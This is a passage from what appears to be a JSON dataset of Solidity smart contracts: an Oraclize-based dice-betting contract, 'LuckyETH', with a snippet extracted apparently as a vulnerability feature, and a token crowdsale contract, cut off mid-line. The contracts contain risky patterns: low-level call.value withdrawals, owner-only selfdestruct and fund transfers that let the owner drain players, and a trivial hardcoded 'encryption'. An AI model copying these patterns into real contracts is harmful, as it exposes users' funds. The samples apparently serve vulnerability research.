= new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\nlibrary strings {\n struct slice {\n uint _len;\n uint _ptr;\n }\n function memcpy(uint dest, uint src, uint len) private {\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n }\n function toSlice(string self) internal returns (slice) {\n uint ptr;\n assembly {\n ptr := add(self, 0x20)\n }\n return slice(bytes(self).length, ptr);\n }\n function len(bytes32 self) internal returns (uint) {\n uint ret;\n if (self == 0)\n return 0;\n if (self & 0xffffffffffffffffffffffffffffffff == 0) {\n ret += 16;\n self = bytes32(uint(self) / 0x100000000000000000000000000000000);\n }\n if (self & 0xffffffffffffffff == 0) {\n ret += 8;\n self = bytes32(uint(self) / 0x10000000000000000);\n }\n if (self & 0xffffffff == 0) {\n ret += 4;\n self = bytes32(uint(self) / 0x100000000);\n }\n if (self & 0xffff == 0) {\n ret += 2;\n self = bytes32(uint(self) / 0x10000);\n }\n if (self & 0xff == 0) {\n ret += 1;\n }\n return 32 - ret;\n }\n function toSliceB32(bytes32 self) internal returns (slice ret) {\n assembly {\n let ptr := mload(0x40)\n mstore(0x40, add(ptr, 0x20))\n mstore(ptr, self)\n mstore(add(ret, 0x20), ptr)\n }\n ret._len = len(self);\n }\n function copy(slice self) internal returns (slice) {\n return slice(self._len, self._ptr);\n }\n function toString(slice self) internal returns (string) {\n var ret = new string(self._len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n memcpy(retptr, self._ptr, self._len);\n return ret;\n }\n function len(slice self) internal returns (uint) {\n var ptr = self._ptr - 31;\n var end = ptr + self._len;\n for (uint len = 0; ptr < end; len++) {\n uint8 b;\n assembly { b := and(mload(ptr), 0xFF) }\n if (b < 0x80) {\n ptr += 1;\n } else if(b < 0xE0) {\n ptr += 2;\n } else if(b < 0xF0) {\n ptr += 3;\n } else if(b < 0xF8) {\n ptr += 4;\n } else if(b < 0xFC) {\n ptr += 5;\n } else {\n ptr += 6;\n }\n }\n return len;\n }\n function empty(slice self) internal returns (bool) {\n return self._len == 0;\n }\n function compare(slice self, slice other) internal returns (int) {\n uint shortest = self._len;\n if (other._len < self._len)\n shortest = other._len;\n var selfptr = self._ptr;\n var otherptr = other._ptr;\n for (uint idx = 0; idx < shortest; idx += 32) {\n uint a;\n uint b;\n assembly {\n a := mload(selfptr)\n b := mload(otherptr)\n }\n if (a != b) {\n uint mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\n var diff = (a & mask) - (b & mask);\n if (diff != 0)\n return int(diff);\n }\n selfptr += 32;\n otherptr += 32;\n }\n return int(self._len) - int(other._len);\n }\n function equals(slice self, slice other) internal returns (bool) {\n return compare(self, other) == 0;\n }\n function nextRune(slice self, slice rune) internal returns (slice) {\n rune._ptr = self._ptr;\n if (self._len == 0) {\n rune._len = 0;\n return rune;\n }\n uint len;\n uint b;\n assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\n if (b < 0x80) {\n len = 1;\n } else if(b < 0xE0) {\n len = 2;\n } else if(b < 0xF0) {\n len = 3;\n } else {\n len = 4;\n }\n if (len > self._len) {\n rune._len = self._len;\n self._ptr += self._len;\n self._len = 0;\n return rune;\n }\n self._ptr += len;\n self._len -= len;\n rune._len = len;\n return rune;\n }\n function nextRune(slice self) internal returns (slice ret) {\n nextRune(self, ret);\n }\n function ord(slice self) internal returns (uint ret) {\n if (self._len == 0) {\n return 0;\n }\n uint word;\n uint len;\n uint div = 2 ** 248;\n assembly { word:= mload(mload(add(self, 32))) }\n var b = word / div;\n if (b < 0x80) {\n ret = b;\n len = 1;\n } else if(b < 0xE0) {\n ret = b & 0x1F;\n len = 2;\n } else if(b < 0xF0) {\n ret = b & 0x0F;\n len = 3;\n } else {\n ret = b & 0x07;\n len = 4;\n }\n if (len > self._len) {\n return 0;\n }\n for (uint i = 1; i < len; i++) {\n div = div / 256;\n b = (word / div) & 0xFF;\n if (b & 0xC0 != 0x80) {\n return 0;\n }\n ret = (ret * 64) | (b & 0x3F);\n }\n return ret;\n }\n function keccak(slice self) internal returns (bytes32 ret) {\n assembly {\n ret := sha3(mload(add(self, 32)), mload(self))\n }\n }\n function startsWith(slice self, slice needle) internal returns (bool) {\n if (self._len < needle._len) {\n return false;\n }\n if (self._ptr == needle._ptr) {\n return true;\n }\n bool equal;\n assembly {\n let len := mload(needle)\n let selfptr := mload(add(self, 0x20))\n let needleptr := mload(add(needle, 0x20))\n equal := eq(sha3(selfptr, len), sha3(needleptr, len))\n }\n return equal;\n }\n function beyond(slice self, slice needle) internal returns (slice) {\n if (self._len < needle._len) {\n return self;\n }\n bool equal = true;\n if (self._ptr != needle._ptr) {\n assembly {\n let len := mload(needle)\n let selfptr := mload(add(self, 0x20))\n let needleptr := mload(add(needle, 0x20))\n equal := eq(sha3(selfptr, len), sha3(needleptr, len))\n }\n }\n if (equal) {\n self._len -= needle._len;\n self._ptr += needle._len;\n }\n return self;\n }\n function endsWith(slice self, slice needle) internal returns (bool) {\n if (self._len < needle._len) {\n return false;\n }\n var selfptr = self._ptr + self._len - needle._len;\n if (selfptr == needle._ptr) {\n return true;\n }\n bool equal;\n assembly {\n let len := mload(needle)\n let needleptr := mload(add(needle, 0x20))\n equal := eq(sha3(selfptr, len), sha3(needleptr, len))\n }\n return equal;\n }\n function until(slice self, slice needle) internal returns (slice) {\n if (self._len < needle._len) {\n return self;\n }\n var selfptr = self._ptr + self._len - needle._len;\n bool equal = true;\n if (selfptr != needle._ptr) {\n assembly {\n let len := mload(needle)\n let needleptr := mload(add(needle, 0x20))\n equal := eq(sha3(selfptr, len), sha3(needleptr, len))\n }\n }\n if (equal) {\n self._len -= needle._len;\n }\n return self;\n }\n function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private returns (uint) {\n uint ptr;\n uint idx;\n if (needlelen <= selflen) {\n if (needlelen <= 32) {\n assembly {\n let mask := not(sub(exp(2, mul(8, sub(32, needlelen))), 1))\n let needledata := and(mload(needleptr), mask)\n let end := add(selfptr, sub(selflen, needlelen))\n ptr := selfptr\n loop:\n jumpi(exit, eq(and(mload(ptr), mask), needledata))\n ptr := add(ptr, 1)\n jumpi(loop, lt(sub(ptr, 1), end))\n ptr := add(selfptr, selflen)\n exit:\n }\n return ptr;\n } else {\n bytes32 hash;\n assembly { hash := sha3(needleptr, needlelen) }\n ptr = selfptr;\n for (idx = 0; idx <= selflen - needlelen; idx++) {\n bytes32 testHash;\n assembly { testHash := sha3(ptr, needlelen) }\n if (hash == testHash)\n return ptr;\n ptr += 1;\n }\n }\n }\n return selfptr + selflen;\n }\n function rfindPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private returns (uint) {\n uint ptr;\n if (needlelen <= selflen) {\n if (needlelen <= 32) {\n assembly {\n let mask := not(sub(exp(2, mul(8, sub(32, needlelen))), 1))\n let needledata := and(mload(needleptr), mask)\n ptr := add(selfptr, sub(selflen, needlelen))\n loop:\n jumpi(ret, eq(and(mload(ptr), mask), needledata))\n ptr := sub(ptr, 1)\n jumpi(loop, gt(add(ptr, 1), selfptr))\n ptr := selfptr\n jump(exit)\n ret:\n ptr := add(ptr, needlelen)\n exit:\n }\n return ptr;\n } else {\n bytes32 hash;\n assembly { hash := sha3(needleptr, needlelen) }\n ptr = selfptr + (selflen - needlelen);\n while (ptr >= selfptr) {\n bytes32 testHash;\n assembly { testHash := sha3(ptr, needlelen) }\n if (hash == testHash)\n return ptr + needlelen;\n ptr -= 1;\n }\n }\n }\n return selfptr;\n }\n function find(slice self, slice needle) internal returns (slice) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\n self._len -= ptr - self._ptr;\n self._ptr = ptr;\n return self;\n }\n function rfind(slice self, slice needle) internal returns (slice) {\n uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\n self._len = ptr - self._ptr;\n return self;\n }\n function split(slice self, slice needle, slice token) internal returns (slice) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\n token._ptr = self._ptr;\n token._len = ptr - self._ptr;\n if (ptr == self._ptr + self._len) {\n self._len = 0;\n } else {\n self._len -= token._len + needle._len;\n self._ptr = ptr + needle._len;\n }\n return token;\n }\n function split(slice self, slice needle) internal returns (slice token) {\n split(self, needle, token);\n }\n function rsplit(slice self, slice needle, slice token) internal returns (slice) {\n uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\n token._ptr = ptr;\n token._len = self._len - (ptr - self._ptr);\n if (ptr == self._ptr) {\n self._len = 0;\n } else {\n self._len -= token._len + needle._len;\n }\n return token;\n }\n function rsplit(slice self, slice needle) internal returns (slice token) {\n rsplit(self, needle, token);\n }\n function count(slice self, slice needle) internal returns (uint count) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr) + needle._len;\n while (ptr <= self._ptr + self._len) {\n count++;\n ptr = findPtr(self._len - (ptr - self._ptr), ptr, needle._len, needle._ptr) + needle._len;\n }\n }\n function contains(slice self, slice needle) internal returns (bool) {\n return rfindPtr(self._len, self._ptr, needle._len, needle._ptr) != self._ptr;\n }\n function concat(slice self, slice other) internal returns (string) {\n var ret = new string(self._len + other._len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n memcpy(retptr, self._ptr, self._len);\n memcpy(retptr + self._len, other._ptr, other._len);\n return ret;\n }\n function join(slice self, slice[] parts) internal returns (string) {\n if (parts.length == 0)\n return \"\";\n uint len = self._len * (parts.length - 1);\n for(uint i = 0; i < parts.length; i++)\n len += parts[i]._len;\n var ret = new string(len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n for(i = 0; i < parts.length; i++) {\n memcpy(retptr, parts[i]._ptr, parts[i]._len);\n retptr += parts[i]._len;\n if (i < parts.length - 1) {\n memcpy(retptr, self._ptr, self._len);\n retptr += self._len;\n }\n }\n return ret;\n }\n}\ncontract DSSafeAddSub {\n function safeToAdd(uint a, uint b) internal returns (bool) {\n return (a + b >= a);\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n if (!safeToAdd(a, b)) throw;\n return a + b;\n }\n function safeToSubtract(uint a, uint b) internal returns (bool) {\n return (b <= a);\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n if (!safeToSubtract(a, b)) throw;\n return a - b;\n }\n}\ncontract LuckyETH is usingOraclize, DSSafeAddSub {\n using strings for *;\n modifier betIsValid(uint _betSize, uint _playerNumber) {\n if(_betSize < minBet || _playerNumber < minNumber || _playerNumber > maxNumber) throw;\n _;\n }\n modifier gameIsActive {\n if(gamePaused == true) throw;\n _;\n }\n modifier payoutsAreActive {\n if(payoutsPaused == true) throw;\n _;\n }\n modifier onlyOraclize {\n if (msg.sender != oraclize_cbAddress()) throw;\n _;\n }\n modifier onlyOwner {\n if (msg.sender != owner) throw;\n _;\n }\n modifier onlyTreasury {\n if (msg.sender != treasury) throw;\n _;\n }\n uint constant public maxNumber = 999;\n uint constant public minNumber = 2;\n bool public gamePaused;\n uint32 public gasForOraclize;\n address public owner;\n bool public payoutsPaused;\n address public treasury;\n uint public minBet;\n uint public maxPendingPayouts;\n string queryUrl = \"http:\n string cryptoFrom = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n string cryptoTo = \"E8HdOBYKcRCD0UT45s1rLQjXIfWZAqS9xlM2ntFNvapb6uiJoyzVPG7hkmeg3w\";\n bool isCaissaSet;\n mapping (bytes32 => address) playerAddress;\n mapping (bytes32 => address) playerTempAddress;\n mapping (bytes32 => bytes32) playerBetId;\n mapping (bytes32 => uint) playerBetValue;\n mapping (bytes32 => uint) playerTempBetValue;\n mapping (bytes32 => uint) playerRandomResult;\n mapping (bytes32 => uint) playerDieResult;\n mapping (bytes32 => uint) playerNumber;\n mapping (address => uint) playerPendingWithdrawals;\n mapping (bytes32 => uint) playerProfit;\n mapping (bytes32 => uint) playerTempReward;\n mapping (bytes32 => address) playerFromAddr;\n mapping (bytes1 => bytes1) caissa;\n function LuckyETH() {\n owner = msg.sender;\n treasury = msg.sender;\n oraclize_setNetwork(networkID_auto);\n oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\n ownerSetMinBet(100000000000000000);\n gasForOraclize = 255000;\n oraclize_setCustomGasPrice(20000000000 wei);\n isCaissaSet = false;\n }\n function toAsciiString(address x) internal returns (string) {\n bytes memory s = new bytes(40);\n for (uint i = 0; i < 20; i++) {\n byte b = byte(uint8(uint(x) / (2**(8*(19 - i)))));\n byte hi = byte(uint8(b) / 16);\n byte lo = byte(uint8(b) - 16 * uint8(hi));\n s[2*i] = char(hi);\n s[2*i+1] = char(lo);\n }\n return string(s);\n }\n function char(byte b) internal returns (byte c) {\n if (b < 10) return byte(uint8(b) + 0x30);\n else return byte(uint8(b) + 0x57);\n }\n function setCaissa() public onlyOwner {\n bytes memory cfrom = bytes(cryptoFrom);\n bytes memory cto = bytes(cryptoTo);\n for (uint i = 0; i < cfrom.length; i++) {\n caissa[cfrom[i]] = cto[i];\n }\n isCaissaSet = true;\n }\n function encrypt(string _v) public view returns (string) {\n require(isCaissaSet == true);\n bytes memory v= bytes(_v);\n uint len = v.length;\n for (uint i = 0; i < len; i++) {\n if (caissa[v[i]] != 0) {\n v[i] = caissa[v[i]];\n }\n }\n return string(v);\n }\n function playerRollDiceSingle(uint rollTimes) public\n payable\n gameIsActive\n betIsValid(msg.value, rollTimes)\n {\n string memory pre1 = strConcat(queryUrl, encrypt(toAsciiString(msg.sender)), \"_\", encrypt(uint2str(msg.value)), \"&max=\");\n bytes32 rngId = oraclize_query(\n \"URL\",\n strConcat(pre1, uint2str(rollTimes), \"&format=pure\"),\n gasForOraclize\n );\n playerFromAddr[rngId] = address(0);\n playerBetId[rngId] = rngId;\n playerNumber[rngId] = rollTimes;\n playerBetValue[rngId] = msg.value;\n playerAddress[rngId] = msg.sender;\n playerProfit[rngId] = msg.value * rollTimes;\n maxPendingPayouts = safeAdd(maxPendingPayouts, playerProfit[rngId]);\n }\n function playerRollDice(uint rollTimes, address fromAddr) public\n payable\n gameIsActive\n betIsValid(msg.value, rollTimes)\n {\n string memory pre1 = strConcat(queryUrl, encrypt(toAsciiString(msg.sender)), \"_\", encrypt(uint2str(msg.value)), \"&max=\");\n bytes32 rngId = oraclize_query(\n \"URL\",\n strConcat(pre1, uint2str(rollTimes), \"&format=pure\"),\n gasForOraclize\n );\n playerFromAddr[rngId] = fromAddr;\n playerBetId[rngId] = rngId;\n playerNumber[rngId] = rollTimes;\n playerBetValue[rngId] = msg.value;\n playerAddress[rngId] = msg.sender;\n playerProfit[rngId] = msg.value * rollTimes;\n maxPendingPayouts = safeAdd(maxPendingPayouts, playerProfit[rngId]);\n }\n function __callback(bytes32 myid, string result, bytes proof) public\n onlyOraclize\n payoutsAreActive\n {\n if (playerAddress[myid]==0x0) throw;\n bool refundFlag = false;\n if (bytes(result).length > 10) {\n refundFlag = true;\n } else {\n playerRandomResult[myid] = parseInt(result);\n }\n playerDieResult[myid] = playerRandomResult[myid];\n playerTempAddress[myid] = playerAddress[myid];\n delete playerAddress[myid];\n playerTempReward[myid] = playerProfit[myid];\n playerProfit[myid] = 0;\n maxPendingPayouts = safeSub(maxPendingPayouts, playerTempReward[myid]);\n playerTempBetValue[myid] = playerBetValue[myid];\n playerBetValue[myid] = 0;\n if(playerDieResult[myid] == 0 || playerRandomResult[myid] == 0|| refundFlag == true)\n {\n if(!playerTempAddress[myid].send(playerTempBetValue[myid]))\n {\n playerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], playerTempBetValue[myid]);\n }\n return;\n }\n if(playerDieResult[myid] == 1)\n {\n uint cutValue1 = playerTempReward[myid] / 100;\n playerTempReward[myid] = safeSub(playerTempReward[myid], cutValue1);\n if(!playerTempAddress[myid].send(playerTempReward[myid]))\n {\n playerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], playerTempReward[myid]);\n }\n if(playerFromAddr[myid] == address(0)) return;\n if(!playerFromAddr[myid].send(playerTempBetValue[myid] * 5 / 1000))\n {\n playerPendingWithdrawals[playerFromAddr[myid]] = safeAdd(playerPendingWithdrawals[playerFromAddr[myid]], playerTempBetValue[myid] * 5 / 1000);\n }\n return;\n }\n if(playerDieResult[myid] != 1){\n uint cutValue2 = playerTempBetValue[myid] * 5 / 1000;\n if(!playerTempAddress[myid].send(1)){\n playerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], 1);\n }\n if(playerFromAddr[myid] == address(0)) return;\n if(!playerFromAddr[myid].send(cutValue2)) {\n playerPendingWithdrawals[playerFromAddr[myid]] = safeAdd(playerPendingWithdrawals[playerFromAddr[myid]], cutValue2);\n }\n return;\n }\n }\n function playerWithdrawPendingTransactions() public\n payoutsAreActive\n returns (bool)\n {\n uint withdrawAmount = playerPendingWithdrawals[msg.sender];\n playerPendingWithdrawals[msg.sender] = 0;\n if (msg.sender.call.value(withdrawAmount)()) {\n return true;\n } else {\n playerPendingWithdrawals[msg.sender] = withdrawAmount;\n return false;\n }\n }\n function playerGetPendingTxByAddress(address addressToCheck) public constant returns (uint) {\n return playerPendingWithdrawals[addressToCheck];\n }\n function ()\n payable\n onlyTreasury\n {\n }\n function ownerSetCallbackGasPrice(uint newCallbackGasPrice) public\n onlyOwner\n {\n oraclize_setCustomGasPrice(newCallbackGasPrice);\n }\n function ownerSetOraclizeSafeGas(uint32 newSafeGasToOraclize) public\n onlyOwner\n {\n gasForOraclize = newSafeGasToOraclize;\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerTransferEther(address sendTo, uint amount) public\n onlyOwner\n {\n if(!sendTo.send(amount)) throw;\n }\n function ownerRefundPlayer(bytes32 originalPlayerBetId, address sendTo, uint originalPlayerProfit, uint originalPlayerBetValue) public\n onlyOwner\n {\n maxPendingPayouts = safeSub(maxPendingPayouts, originalPlayerProfit);\n if(!sendTo.send(originalPlayerBetValue)) throw;\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerPausePayouts(bool newPayoutStatus) public\n onlyOwner\n {\n payoutsPaused = newPayoutStatus;\n }\n function ownerSetTreasury(address newTreasury) public\n onlyOwner\n {\n treasury = newTreasury;\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n }\n function ownerkill() public\n onlyOwner\n {\n suicide(owner);\n }\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1454"
  },
  "filename": "22675.sol",
  "content": "pragma solidity 0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns(uint256) {\n if(a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns(uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns(uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns(uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n modifier onlyOwner() { require(msg.sender == owner); _; }\n function Ownable() public {\n owner = msg.sender;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n owner = newOwner;\n OwnershipTransferred(owner, newOwner);\n }\n}\ncontract Pausable is Ownable {\n bool public paused = false;\n event Pause();\n event Unpause();\n modifier whenNotPaused() { require(!paused); _; }\n modifier whenPaused() { require(paused); _; }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract Withdrawable is Ownable {\n function withdrawEther(address _to, uint _value) onlyOwner public returns(bool) {\n require(_to != address(0));\n require(this.balance >= _value);\n _to.transfer(_value);\n return true;\n }\n function withdrawTokens(ERC20 _token, address _to, uint _value) onlyOwner public returns(bool) {\n require(_to != address(0));\n return _token.transfer(_to, _value);\n }\n}\ncontract ERC20 {\n uint256 public totalSupply;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function balanceOf(address who) public view returns(uint256);\n function transfer(address to, uint256 value) public returns(bool);\n function transferFrom(address from, address to, uint256 value) public returns(bool);\n function allowance(address owner, address spender) public view returns(uint256);\n function approve(address spender, uint256 value) public returns(bool);\n}\ncontract ERC223 is ERC20 {\n function transfer(address to, uint256 value, bytes data) public returns(bool);\n}\ncontract ERC223Receiving {\n function tokenFallback(address from, uint256 value, bytes data) external;\n}\ncontract StandardToken is ERC223 {\n using SafeMath for uint256;\n string public name;\n string public symbol;\n uint8 public decimals;\n mapping(address => uint256) balances;\n mapping (address => mapping (address => uint256)) internal allowed;\n function StandardToken(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n function balanceOf(address _owner) public view returns(uint256 balance) {\n return balances[_owner];\n }\n function _transfer(address _to, uint256 _value, bytes _data) private returns(bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n bool is_contract = false;\n assembly {\n is_contract := not(iszero(extcodesize(_to)))\n }\n if(is_contract) {\n ERC223Receiving receiver = ERC223Receiving(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns(bool) {\n bytes memory empty;\n return _transfer(_to, _value, empty);\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns(bool) {\n return _transfer(_to, _value, _data);\n }\n function multiTransfer(address[] _to, uint256[] _value) public returns(bool) {\n require(_to.length == _value.length);\n for(uint i = 0; i < _to.length; i++) {\n transfer(_to[i], _value[i]);\n }\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns(bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns(uint256) {\n return allowed[_owner][_spender];\n }\n function approve(address _spender, uint256 _value) public returns(bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue) public returns(bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns(bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if(_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() { require(!mintingFinished); _; }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns(bool) {\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns(bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract CappedToken is MintableToken {\n uint256 public cap;\n function CappedToken(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns(bool) {\n require(totalSupply.add(_amount) <= cap);\n return super.mint(_to, _amount);\n }\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Token is CappedToken, BurnableToken, Withdrawable {\n function Token() CappedToken(70000000 * 1 ether) StandardToken(\"IAM Aero\", \"IAM\", 18) public {\n }\n function tokenFallback(address _from, uint256 _value, bytes _data) external {\n require(false);\n }\n}\ncontract Crowdsale is Pausable, Withdrawable, ERC223Receiving {\n using SafeMath for uint;\n struct Step {\n uint priceTokenWei;\n uint tokensForSale;\n uint minInvestEth;\n uint tokensSold;\n uint collectedWei;\n bool transferBalance;\n bool sale;\n }\n Token public token;\n address public beneficiary = 0x4ae7bdf9530cdB666FC14DF79C169e14504c621A;\n Step[] public steps;\n uint8 public currentStep = 0;\n bool public crowdsaleClosed = false;\n mapping(address => uint256) public canSell;\n event Purchase(address indexed holder, uint256 tokenAmount, uint256 etherAmount);\n event Sell(address indexed holder, uint256 tokenAmount, uint256 etherAmount);\n event NewRate(uint256 rate);\n event NextStep(uint8 step);\n event CrowdsaleClose();\n function Crowdsale() public {\n token = new Token();\n steps.push(Step(1 ether / 1000, 1000000 * 1 ether, 0.01 ether, 0, 0, true, false));\n steps.push(Step(1 ether / 1000, 1500000 * 1 ether, 0.01 ether, 0, 0, true, false));\n steps.push(Step(1 ether / 1000, 3000000 * 1 ether, 0.01 ether, 0, 0, true, false));\n steps.push(Step(1 ether / 1000, 9000000 * 1 ether, 0.01 ether, 0, 0, true, false));\n steps.push(Step(1 ether / 1000, 35000000 * 1 ether, 0.01 ether, 0, 0, true, false));\n steps.push(Step(1 ether / 1000, 20500000 * 1 ether, 0.01 ether, 0, 0, true, true));\n }\n function() payable public {\n purchase();\n }\n function tokenFallback(address _from, uint256 _value, bytes _data) external {\n sell(_value);\n }\n function setTokenRate(uint _value) onlyOwner public {\n require(!crowdsaleClosed);\n steps[currentStep].priceTokenWei = 1 ether / _value;\n NewRate(steps[currentStep].priceTokenWei);\n }\n function purchase() whenNotPaused payable public {\n require(!crowdsaleClosed);\n Step memory step = steps[currentStep];\n require(msg.value >= step.minInvestEth);\n require(step.tokensSold < step.tokensForSale);\n uint sum = msg.value;\n uint amount = sum.mul(1 ether).div(step.priceTokenWei);\n uint retSum = 0;\n if(step.tokensSold.add(amount) > step.tokensForSale) {\n uint retAmount = step.tokensSold.add(amount).sub(step.tokensForSale);\n retSum = retAmount.mul(step.priceTokenWei).div(1 ether);\n amount = amount.sub(retAmount);\n sum = sum.sub(retSum);\n }\n steps[currentStep].tokensSold = 